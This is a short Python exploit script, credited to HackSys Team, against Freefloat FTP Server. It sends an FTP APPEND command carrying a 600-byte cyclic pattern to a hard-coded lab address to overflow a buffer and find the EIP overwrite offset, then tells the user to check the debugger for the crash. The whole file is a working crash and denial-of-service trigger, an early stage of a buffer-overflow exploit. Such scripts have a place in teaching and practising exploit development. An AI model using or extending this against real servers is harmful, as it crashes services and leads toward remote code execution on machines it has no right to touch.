#!/usr/bin/python
import socket, sys, os, time
 
print "\n+---------------------------------------+"
print "+  Freefloat FTP Server Buffer Overflow +"
print "+       HackSys Team - Panthera         +"
print "+            Ashfaq Ansari              +"
print "+       hacksysteam@hotmail.com         +"
print "+      http://hacksys.vfreaks.com/      +"
print "+---------------------------------------+\n"

#Target IP address
target = "192.168.96.131"
#Target Port
port = 21

#Junk data to obtain EIP overwrite offset 600 bytes
junk = ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac"
		"4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8A"
		"e9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3"
		"Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj"
		"8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2A"
		"m3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7"
		"Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar"
		"2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9")

#Create socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "[+] Connecting to %s on port %d" % (target,port)
try:
	#Connect to target port
    s.connect((target,port))
	#Receive 1024 bytes
    s.recv(1024)
    print "[+] Triggering Vulnerability - Sending junk data"
	#Send vulnerable command
    s.send("APPEND " + junk + "\r\n")
	#Close the socket
    s.close()
    print "[+] Check your debugger for a crash."

except:
    print "[-] Could not connect to %s on port %d" % (target,port)
	#Exit the exploit
    sys.exit(0)
    
